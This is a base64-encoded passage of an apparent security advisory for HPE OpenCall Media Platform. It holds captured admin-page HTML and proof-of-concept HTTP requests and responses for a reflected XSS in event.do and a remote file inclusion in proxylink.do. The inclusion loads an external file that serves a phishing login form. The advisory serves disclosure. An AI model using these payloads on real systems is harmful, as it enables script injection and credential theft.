48L3RkPg0KDQogICAgPHRkPnNpcDp1bmF2YWlsYWJsZUB1bmtub3duLmludmFsaWQ8L3RkPg0KICAgIDx0ZD4rMTU0MjAwMDQ3MDg1MjQyMzwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF8zMl82MzRfMiZ0eXBlPUVSUk9SDQp0YXJnZXQ9Im5ldyI+MTwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfMzJfNjM0XzImdHlwZT1XQVJODQp0YXJnZXQ9Im5ldyI+MDwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfMzJfNjM0XzImdHlwZT12eG1sX2V4Y2VwdGlvbg0KdGFyZ2V0PSJuZXciPjIxPC9hPjwvdGQ+DQogICAgPHRkPjE1MDkwOCAxOToyNzo1Ni4yMzc8L3RkPjx0ZD4wMDowMDowMS4wMDM8L3RkPg0KDQogICAgPC90cj4NCg0KICAgIDx0cj4NCg0KICAgIDx0ZD50YjBvY21wMDwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0icHJveHlsaW5rLmRvP3VybD1odHRwcyUzQSUyRiUyRnRiMG9jbXAwJTNBNTQ0MyUyRm1pdCUyRmxvZ3MlMkZjYWxsaWRzJTJGdnhpX2RpYWxvZ18wXzQwXzQyMF8xJTNGbXVsdGlub2RlVXNlciUzRG9jYWRtaW4lMjZjbHVzdGVySUQlM0Q3QTJDODdFRDdENzlFRTc2NDQyODdDM0I0MTUxRkIxMyZjb250ZW50dHlwZT10ZXh0L2h0bWwiDQp0YXJnZXQ9Il9uZXciPnZ4aV9kaWFsb2dfMF80MF80MjBfMTwvYT48L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InByb3h5bGluay5kbz91cmw9aHR0cHMlM0ElMkYlMkZ0YjBvY21wMCUzQTU0NDMlMkZtaXQlMkZzeXN0ZW0lMkZjZHIlMkZ2eGlfZGlhbG9nXzBfNDBfNDIwXzElM0ZtdWx0aW5vZGVVc2VyJTNEb2NhZG1pbiUyNmNsdXN0ZXJJRCUzRDdBMkM4N0VEN0Q3OUVFNzY0NDI4N0MzQjQxNTFGQjEzIg0KdGFyZ2V0PSJfbmV3Ij5DRFI8L2E+PC90ZD4NCiAgICA8dGQ+PGEgaHJlZj0iY2FsbC5kbz9hY3Rpb249bW9uaXRvciZjaWQ9dnhpX2RpYWxvZ18wXzQwXzQyMF8xJm5vZGU9dGIwb2NtcDAiPk1vbml0b3I8L2E+PC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJzZXJ2aWNlLmRvP2FjdGlvbj11cGRhdGUmaWQ9bzJfaXZyXzB4eHgiPm8yX2l2cl8weHh4PC9hPjwvdGQ+DQoNCiAgICA8dGQ+c2lwOnVuYXZhaWxhYmxlQHVua25vd24uaW52YWxpZDwvdGQ+DQogICAgPHRkPisxNTQyMDAwNDcwNjMyNzIzPC90ZD4NCiAgICA8dGQ+PGEgaHJlZj1ldmVudC5kbz9hY3Rpb249bGlzdCZjYWxsaWQ9dnhpX2RpYWxvZ18wXzQwXzQyMF8xJnR5cGU9RVJST1INCnRhcmdldD0ibmV3Ij4xPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF80MF80MjBfMSZ0eXBlPVdBUk4NCnRhcmdldD0ibmV3Ij4wPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF80MF80MjBfMSZ0eXBlPXZ4bWxfZXhjZXB0aW9uDQp0YXJnZXQ9Im5ldyI+MjE8L2E+PC90ZD4NCiAgICA8dGQ+MTUwOTA3IDE4OjU3OjIxLjU0ODwvdGQ+PHRkPjAwOjAwOjAxLjAwNDwvdGQ+DQoNCiAgICA8L3RyPg0KDQogICAgPHRyIGJnY29sb3I9ImVlZWVlZSI+DQoNCiAgICA8dGQ+dGIwb2NtcDE8L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InByb3h5bGluay5kbz91cmw9aHR0cHMlM0ElMkYlMkZ0YjBvY21wMSUzQTU0NDMlMkZtaXQlMkZsb2dzJTJGY2FsbGlkcyUyRnZ4aV9kaWFsb2dfMF8zMl82MzRfMSUzRm11bHRpbm9kZVVzZXIlM0RvY2FkbWluJTI2Y2x1c3RlcklEJTNEN0EyQzg3RUQ3RDc5RUU3NjQ0Mjg3QzNCNDE1MUZCMTMmY29udGVudHR5cGU9dGV4dC9odG1sIg0KdGFyZ2V0PSJfbmV3Ij52eGlfZGlhbG9nXzBfMzJfNjM0XzE8L2E+PC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJwcm94eWxpbmsuZG8/dXJsPWh0dHBzJTNBJTJGJTJGdGIwb2NtcDElM0E1NDQzJTJGbWl0JTJGc3lzdGVtJTJGY2RyJTJGdnhpX2RpYWxvZ18wXzMyXzYzNF8xJTNGbXVsdGlub2RlVXNlciUzRG9jYWRtaW4lMjZjbHVzdGVySUQlM0Q3QTJDODdFRDdENzlFRTc2NDQyODdDM0I0MTUxRkIxMyINCnRhcmdldD0iX25ldyI+Q0RSPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ImNhbGwuZG8/YWN0aW9uPW1vbml0b3ImY2lkPXZ4aV9kaWFsb2dfMF8zMl82MzRfMSZub2RlPXRiMG9jbXAxIj5Nb25pdG9yPC9hPjwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0ic2VydmljZS5kbz9hY3Rpb249dXBkYXRlJmlkPW8yX2l2cl8weHh4Ij5vMl9pdnJfMHh4eDwvYT48L3RkPg0KDQogICAgPHRkPnNpcDp1bmF2YWlsYWJsZUB1bmtub3duLmludmFsaWQ8L3RkPg0KICAgIDx0ZD4rMTU0MjAwMDQ3MDI3NzAyMzwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF8zMl82MzRfMSZ0eXBlPUVSUk9SDQp0YXJnZXQ9Im5ldyI+MTwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfMzJfNjM0XzEmdHlwZT1XQVJODQp0YXJnZXQ9Im5ldyI+MDwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfMzJfNjM0XzEmdHlwZT12eG1sX2V4Y2VwdGlvbg0KdGFyZ2V0PSJuZXciPjIxPC9hPjwvdGQ+DQogICAgPHRkPjE1MDkwNyAxNToxMzoxOS42NjA8L3RkPjx0ZD4wMDowMDowMS4wMDM8L3RkPg0KDQogICAgPC90cj4NCg0KICAgIDx0cj4NCiAgICA8dGQ+dGIwb2NtcDA8L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InByb3h5bGluay5kbz91cmw9aHR0cHMlM0ElMkYlMkZ0YjBvY21wMCUzQTU0NDMlMkZtaXQlMkZsb2dzJTJGY2FsbGlkcyUyRnZ4aV9kaWFsb2dfMF80MF80MjBfMCUzRm11bHRpbm9kZVVzZXIlM0RvY2FkbWluJTI2Y2x1c3RlcklEJTNEN0EyQzg3RUQ3RDc5RUU3NjQ0Mjg3QzNCNDE1MUZCMTMmY29udGVudHR5cGU9dGV4dC9odG1sIg0KdGFyZ2V0PSJfbmV3Ij52eGlfZGlhbG9nXzBfNDBfNDIwXzA8L2E+PC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJwcm94eWxpbmsuZG8/dXJsPWh0dHBzJTNBJTJGJTJGdGIwb2NtcDAlM0E1NDQzJTJGbWl0JTJGc3lzdGVtJTJGY2RyJTJGdnhpX2RpYWxvZ18wXzQwXzQyMF8wJTNGbXVsdGlub2RlVXNlciUzRG9jYWRtaW4lMjZjbHVzdGVySUQlM0Q3QTJDODdFRDdENzlFRTc2NDQyODdDM0I0MTUxRkIxMyINCnRhcmdldD0iX25ldyI+Q0RSPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ImNhbGwuZG8/YWN0aW9uPW1vbml0b3ImY2lkPXZ4aV9kaWFsb2dfMF80MF80MjBfMCZub2RlPXRiMG9jbXAwIj5Nb25pdG9yPC9hPjwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0ic2VydmljZS5kbz9hY3Rpb249dXBkYXRlJmlkPW8yX2l2cl8weHh4Ij5vMl9pdnJfMHh4eDwvYT48L3RkPg0KDQogICAgPHRkPnNpcDp1bmF2YWlsYWJsZUB1bmtub3duLmludmFsaWQ8L3RkPg0KICAgIDx0ZD4rMTU0MjAwMDQ3MDg2MDgyMzwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF80MF80MjBfMCZ0eXBlPUVSUk9SDQp0YXJnZXQ9Im5ldyI+MTwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfNDBfNDIwXzAmdHlwZT1XQVJODQp0YXJnZXQ9Im5ldyI+MDwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfNDBfNDIwXzAmdHlwZT12eG1sX2V4Y2VwdGlvbg0KdGFyZ2V0PSJuZXciPjIxPC9hPjwvdGQ+DQogICAgPHRkPjE1MDkwNyAxNToxMjoxNS4yNTQ8L3RkPjx0ZD4wMDowMDowMC41MDE8L3RkPg0KDQoNCiAgICA8L3RyPg0KDQoNCg0KICAgIDx0ciBiZ2NvbG9yPSJlZWVlZWUiPg0KDQogICAgPHRkPnRiMG9jbXAwPC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJwcm94eWxpbmsuZG8/dXJsPWh0dHBzJTNBJTJGJTJGdGIwb2NtcDAlM0E1NDQzJTJGbWl0JTJGbG9ncyUyRmNhbGxpZHMlMkZ2eGlfZGlhbG9nXzBfMzJfNjM0XzAlM0ZtdWx0aW5vZGVVc2VyJTNEb2NhZG1pbiUyNmNsdXN0ZXJJRCUzRDdBMkM4N0VEN0Q3OUVFNzY0NDI4N0MzQjQxNTFGQjEzJmNvbnRlbnR0eXBlPXRleHQvaHRtbCINCnRhcmdldD0iX25ldyI+dnhpX2RpYWxvZ18wXzMyXzYzNF8wPC9hPjwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0icHJveHlsaW5rLmRvP3VybD1odHRwcyUzQSUyRiUyRnRiMG9jbXAwJTNBNTQ0MyUyRm1pdCUyRnN5c3RlbSUyRmNkciUyRnZ4aV9kaWFsb2dfMF8zMl82MzRfMCUzRm11bHRpbm9kZVVzZXIlM0RvY2FkbWluJTI2Y2x1c3RlcklEJTNEN0EyQzg3RUQ3RDc5RUU3NjQ0Mjg3QzNCNDE1MUZCMTMiDQp0YXJnZXQ9Il9uZXciPkNEUjwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPSJjYWxsLmRvP2FjdGlvbj1tb25pdG9yJmNpZD12eGlfZGlhbG9nXzBfMzJfNjM0XzAmbm9kZT10YjBvY21wMCI+TW9uaXRvcjwvYT48L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InNlcnZpY2UuZG8/YWN0aW9uPXVwZGF0ZSZpZD1vMl9pdnJfM3h4eCI+bzJfaXZyXzN4eHg8L2E+PC90ZD4NCg0KICAgIDx0ZD5zaXA6dW5hdmFpbGFibGVAdW5rbm93bi5pbnZhbGlkPC90ZD4NCiAgICA8dGQ+KzE1NDAwMDMwMDAwMDkzODg8L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfMzJfNjM0XzAmdHlwZT1FUlJPUg0KdGFyZ2V0PSJuZXciPjA8L2E+PC90ZD4NCiAgICA8dGQ+PGEgaHJlZj1ldmVudC5kbz9hY3Rpb249bGlzdCZjYWxsaWQ9dnhpX2RpYWxvZ18wXzMyXzYzNF8wJnR5cGU9V0FSTg0KdGFyZ2V0PSJuZXciPjA8L2E+PC90ZD4NCiAgICA8dGQ+PGEgaHJlZj1ldmVudC5kbz9hY3Rpb249bGlzdCZjYWxsaWQ9dnhpX2RpYWxvZ18wXzMyXzYzNF8wJnR5cGU9dnhtbF9leGNlcHRpb24NCnRhcmdldD0ibmV3Ij4wPC9hPjwvdGQ+DQogICAgPHRkPjE1MDkwNyAxNTowMDoxMy45MDE8L3RkPjx0ZD4wMDowMDo0NS4xOTQ8L3RkPg0KDQoNCiAgICA8L3RyPg0KDQoNCg0KDQoNCjwvdGFibGU+DQoNCjwvVEQ+DQo8L1RSPg0KPC9UQUJMRT4NCjwvQk9EWT4NCjwvSFRNTD4NCg0KVm9pY2VYTUwgQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgZXZlbnQuZG8gZnVuY3Rpb24NCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgZG9lcyBub3Qgc2FuaXRpemUgZXZlbnQuZG8gZnVuY3Rpb24NCnBhcmFtZXRlcnMgaW5wdXQuIEFuIGF0dGFja2VyIGNhbiBpbmplY3QgbWFsaWNpb3VzIEphdmEgc2NyaXB0IHRvDQp0cmlnZ2VyIHRoZSBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykuDQoNClRoZSB2dWxuZXJhYmxlIFVSTDogL29tL2V2ZW50LmRvP2FjdGlvbj1saXN0JnR5cGU9WFNTX0hFUkUNCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZToNCg0KR0VUIC9vbS9ldmVudC5kbz9hY3Rpb249bGlzdCZ0eXBlPUFjdGl2ZTYzN2EzPHNjcmlwdD5hbGVydCgxKTwlMmZzY3JpcHQ+YzdlOWYNCkhUVFAvMS4xDQpBY2NlcHQ6IHRleHQvaHRtbCwgYXBwbGljYXRpb24veGh0bWwreG1sLCAqLyoNClJlZmVyZXI6IGh0dHBzOi8vMTcyLjI3LjExNi4zMjo1NDQzL29tL2NhbGwuZG8/YWN0aW9uPXRyYWNlX2NhbGxzJnR5cGU9dHJhY2VfY2FsbHMNCkFjY2VwdC1MYW5ndWFnZTogZW4tR0INClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkhvc3Q6IDE3Mi4yNy4xMTYuMzI6NTQ0Mw0KRE5UOiAxDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQpDb29raWU6IEpTRVNTSU9OSUQ9NUY5MTk2MTA3QTM0NTQxMzNENDE5MENEQjA4NkUwM0INCg0KVGhlIHNlcnZlciB3aWxsIHJlc3BvbmQgd2l0aDoNCg0KSFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEFwYWNoZS1Db3lvdGUvMS4xDQpQcmFnbWE6IE5vLWNhY2hlDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KRXhwaXJlczogVGh1LCAwMSBEZWMgMTk5NCAxNjowMDowMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9SVNPLTg4NTktMQ0KQ29udGVudC1MZW5ndGg6IDI0MzcNCkRhdGU6IFRodSwgMTAgU2VwIDIwMTUgMTM6MzI6NTUgR01UDQoNCg0KDQoNCg0KPEhUTUw+DQo8SEVBRD4NCjxUSVRMRT5Wb2ljZVhNTCBFbnZpcm9ubWVudCBPcGVyYXRpb24gYW5kIE1haW50ZW5hbmNlIG9uIHRiMG9jbXAwPC9USVRMRT4NCjxMSU5LIFJFTD0ic3R5bGVzaGVldCINCkhSRUY9ImNvbnNvbGVwYWdlcy90ZW1wbGF0ZXMvc3R5bGVzaGVldHMvc3R5bGUuY3NzIiBUWVBFPSJ0ZXh0L2NzcyI+DQo8L0hFQUQ+DQoNCjxCT0RZPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KDQovL0hWIE1lbnUgdjUtIGJ5IEdlciBWZXJzbHVpcyAod3d3LmJ1cm1lZXMubmwpDQovL1N1Ym1pdHRlZCB0byBEeW5hbWljIERyaXZlICh3d3cuZHluYW1pY2RyaXZlLmNvbSkNCi8vVmlzaXQgd3d3LmR5bmFtaWNkcml2ZS5jb20gZm9yIHRoaXMgc2NyaXB0IGFuZCBtb3JlDQoNCmZ1bmN0aW9uIEdvKCl7cmV0dXJufQ0KDQo8L3NjcmlwdD4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ig0Kc3JjPSJjb25zb2xlcGFnZXMvdGVtcGxhdGVzL2pzL2V4bXBsbWVudV92YXIuanNwIj48L3NjcmlwdD4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ig0Kc3JjPSJjb25zb2xlcGFnZXMvdGVtcGxhdGVzL2pzL21lbnVfY29tLmpzIj48L3NjcmlwdD4NCjxub3NjcmlwdD5Zb3VyIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCBzY3JpcHQ8L25vc2NyaXB0Pg0KDQo8VEFCTEUgV0lEVEg9IjgwMCIgQk9SREVSPSIwIj4NCjxUUj4NCjxURD48SU1HIFNSQz0iY29uc29sZXBhZ2VzL3RlbXBsYXRlcy9pbWFnZXMvc3BlZWNod2ViLmdpZiIvPjwvVEQ+DQo8L1RSPg0KPFRSPg0KDQo8VEQgVkFMSUdOPSJ0b3AiPg0KTG9nZ2VkIG9uIGFzOiB6ZXJwc3RhMSA8U1BBTiBpZD0id2FybiI+ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICZuYnNwOw0KJm5ic3A7ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICAgICAgPC9TUEFOPg0KPEJSPjxCUj48QlI+PEJSPg0KDQoNCg0KDQoNCg0KPHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+DQogIGZ1bmN0aW9uIHRvZ2dsZVZpc2liaWxpdHkoIGRpdklkLCBidXR0b25JZCApIHsNCiAgICBpZiggZG9jdW1lbnQuYWxsW2RpdklkXS5zdHlsZS5kaXNwbGF5ID09ICdub25lJyApIHsNCiAgICAgIGRvY3VtZW50LmFsbFtkaXZJZF0uc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUnOw0KICAgICAgZG9jdW1lbnQuYWxsW2J1dHRvbklkXS52YWx1ZSA9ICdIaWRlIFN0YWNrdHJhY2UnOw0KICAgIH0gZWxzZSB7DQogICAgICBkb2N1bWVudC5hbGxbZGl2SWRdLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5hbGxbYnV0dG9uSWRdLnZhbHVlID0gJ1Nob3cgU3RhY2t0cmFjZSc7DQogICAgfQ0KICB9DQo8L3NjcmlwdD4NCg0KPGJyPg0KPGI+QWN0aXZlNjM3YTM8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+YzdlOWY8L2I+DQo8YnI+PGJyPg0KDQoNCjxmb3JtIGFjdGlvbj0iZXZlbnQuZG8iPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlJlc2V0IiBuYW1lPSJzdWJtaXQiIG9uQ2xpY2s9InJldHVybg0KY29uZmlybSgnQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIHJlbW92ZSBhbGwNCkFjdGl2ZTYzN2EzPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PmM3ZTlmPycpIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9cmVzZXQgPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idHlwZSINCnZhbHVlPSJBY3RpdmU2MzdhMzxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5jN2U5ZiI+DQo8L2Zvcm0+DQo8YnI+PGJyPg0KDQoNCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMjAwIj4NCjx0cj48dGQgY29sc3Bhbj0iOCIgY2xhc3M9InRhYmxlaGVhZGVyIj5FdmVudHMgPGEgaHJlZj0iIyI+PGltZw0Kc3JjPSJjb25zb2xlcGFnZXMvdGVtcGxhdGVzL2ltYWdlcy9xdWVzdGlvbm1hcmsuZ2lmIiBib3JkZXI9IjAiDQpvbkNsaWNrPSJ3aW5kb3cub3BlbignaGVscC5kbz9wcm9tcHQ9cDIxJywgJ2hlbHAnLA0KJ3Rvb2xiYXI9bm8sd2lkdGg9NDAwLGhlaWdodD00MDAscmVzaXphYmxlPW5vLHNjcm9sbGJhcnM9eWVzJyk7Ij48L2E+PC90ZD48L3RyPg0KPHRyPjx0ZCBjb2xzcGFuPSI4Ij4mbmJzcDs8L3RkPjwvdHI+DQo8dHI+DQo8dGQ+PGI+PGEgaHJlZj1ldmVudC5kbz9hY3Rpb249c29ydCZ0eXBlPU5PREUgPlNlcnZlciBJZDwvYT48L2I+PC90ZD4NCjx0ZD48Yj48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1zb3J0JnR5cGU9VElNRSA+RGF0ZTwvYT48L2I+PC90ZD4NCjx0ZD48Yj48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1zb3J0JnR5cGU9Q0FMTCA+Q2FsbElkPC9hPjwvYj48L3RkPg0KPHRkPjxiPkNEUjwvYj48L3RkPg0KPHRkPjxiPlNlcnZpY2UgSWQ8L2I+PC90ZD4NCjx0ZD48Yj5NZXNzYWdlPC9iPjwvdGQ+DQo8L3RyPg0KDQo8dHI+PHRkIGNvbHNwYW49IjgiPiZuYnNwOzwvdGQ+PC90cj4NCiAgPHRyPjx0ZCBjb2xzcGFuPSI4Ij5ObyBJdGVtcyBGb3VuZDwvdGQ+PC90cj4NCg0KPC9URD4NCjwvVFI+DQo8L1RBQkxFPg0KPC9CT0RZPg0KPC9IVE1MPg0KDQpWb2ljZVhNTCBBZG1pbmlzdHJhdGlvbiBUb29sIOKAkyBwcm94eWxpbmsuZG8gZnVuY3Rpb24NCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgZG9lcyBub3Qgc2FuaXRpemUgcHJveHlsaW5rLmRvDQpmdW5jdGlvbiBwYXJhbWV0ZXJzIGlucHV0LiBBbiBhdHRhY2tlciBjYW4gaW5qZWN0IG1hbGljaW91cyBVUkwgdG8NCmluY2x1ZGluZyByZW1vdGUgZmlsZXMuIEFmdGVyIHRoZSBhdHRhY2tlciBpbmNsdWRlIHRoZSBmaWxlLCB0aGUgSFBFDQpPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSB3aWxsIHBhcnNlIGFuZCBleGVjdXRlIHRoZSBjb250ZW50IG9mIHRoZQ0KZmlsZS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOiAvb20vcHJveHlsaW5rLmRvP3VybD1SZW1vdGUgRmlsZSBJbmNsdXNpb24gSGVyZSAoUkZJKQ0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBHRVQgcmVxdWVzdCB0byB0aGUgdmljdGltcyBtYWNoaW5lOg0KDQpHRVQgL29tL3Byb3h5bGluay5kbz91cmw9aHR0cDovLzE3Mi4yNy4xMjAuMjIwOjk1OTUvZnJ1dXV1ay50eHQgSFRUUC8xLjENCkFjY2VwdDogdGV4dC9odG1sLCBhcHBsaWNhdGlvbi94aHRtbCt4bWwsICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1HQg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KSG9zdDogMTcyLjI3LjExNi4zMjo1NDQzDQpETlQ6IDENCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkNvb2tpZTogSlNFU1NJT05JRD01RDhDMzExQkJFMjc4NEZCMkNFNkRCOTcwODc4RDNDQQ0KDQpUaGUgc2VydmVyIHdpbGwgcmVzcG9uZCB3aXRoOg0KDQpIVFRQLzEuMSAyMDAgT0sNClNlcnZlcjogQXBhY2hlLUNveW90ZS8xLjENClByYWdtYTogTm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlDQpFeHBpcmVzOiBUaHUsIDAxIERlYyAxOTk0IDE2OjAwOjAwIEdNVA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMjU2NQ0KRGF0ZTogV2VkLCAwOSBTZXAgMjAxNSAxMzowMDo1MyBHTVQNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPlBISVNISU5HIExPR0lOIFBBR0U8L3RpdGxlPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVMtQVNDSUkiPg0KPGxpbmsgcmVsPSJTaG9ydGN1dCBJY29uIiBocmVmPSIvbG9naW4vaW1hZ2VzL2hwLmljbyI+DQo8c2NyaXB0Pg0KZnVuY3Rpb24gb25Mb2dpbkZvcm5Mb2FkKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0eHRVc2VybmFtZSIpLmZvY3VzKCk7DQp9DQo8L3NjcmlwdD4NCiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KICAgICAgICAuc3R5bGUxDQogICAgICAgIHsNCiAgICAgICAgICAgIHdpZHRoOiAyOTBweDsNCiAgICAgICAgfQ0KICAgICAgICAuc3R5bGUyDQogICAgICAgIHsNCiAgICAgICAgICAgIHdpZHRoOiAyODVweDsNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQoNCjxib2R5IG9ubG9hZD0ib25Mb2dpbkZvcm5Mb2FkKCkiPg0KPGgyPlBISVNISU5HIExPR0lOIFBBR0U8L2gyPg0KPHNjcmlwdD5kb2N1bWVudC53cml0ZSgiSWBtIGFsc28gcnVubmluZyBKUyIpOzwvc2NyaXB0Pg0KPGZvcm0gYWN0aW9uPSJqX3NlY3VyaXR5X2NoZWNrIiBtZXRob2Q9IlBPU1QiPg0KPHRhYmxlIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSINCnN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmIj4NCjx0cj4NCiAgICA8dGQgYWxpZ249ImNlbnRlciIgdmFsaWduPSJtaWRkbGUiPg0KICAgICAgICA8dGFibGUgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiBoZWlnaHQ9IjMwOSINCiAgICAgICAgICAgICAgICBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgIzAwMDAwMDsgYmFja2dyb3VuZC1wb3NpdGlvbjoNCmxlZnQgdG9wOyBiYWNrZ3JvdW5kLWltYWdlOnVybCgnL2xvZ2luL2ltYWdlcy9ocF9sb2dvLnBuZycpOw0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsgd2lkdGg6IDU3NnB4OyBjbGlwOiByZWN0KDFweCwgYXV0bywNCmF1dG8sIGF1dG8pOyIgPg0KICAgICAgICA8dHI+DQogICAgICAgICAgICA8dGQgY2xhc3M9InN0eWxlMiI+Jm5ic3A7PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0ic3R5bGUxIj4NCjx0YWJsZSBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkIHdpZHRoPSI2MCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHlsZT0iZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsDQpzYW5zLXNlcmlmOyBjb2xvcjogIzAwMDAwMDsgZm9udC13ZWlnaHQ6IGJvbGQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVzZXImbmJzcDtOYW1lJm5ic3A7Jm5ic3A7PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPHRkPjxpbnB1dCBuYW1lPSJqX3VzZXJuYW1lIiB0eXBlPSJ0ZXh0IiBzaXplPSIxNCINCn